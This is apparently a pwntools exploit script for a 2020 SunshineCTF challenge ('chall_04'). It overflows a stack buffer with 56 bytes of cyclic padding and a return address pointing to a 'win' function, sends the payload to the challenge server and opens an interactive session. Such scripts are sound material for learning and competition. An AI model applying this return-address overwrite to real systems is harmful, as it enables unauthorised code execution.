from pwn import *

context.arch = 'amd64'

binary = ELF('chall_04')

sh = remote('chal.2020.sunshinectf.org', 30004)
# sh = process('./chall_04')

win_addr = 0x4005b7

payload = cyclic(56) + p64(win_addr)

p1 = "A" * 13

with open('payload', 'w') as f:
    f.write(p1 + '\n')

with open('payload', 'ab') as f:
    f.write(payload)

sh.recvline()
sh.sendline(p1)

sh.sendline(payload)
sh.interactive()
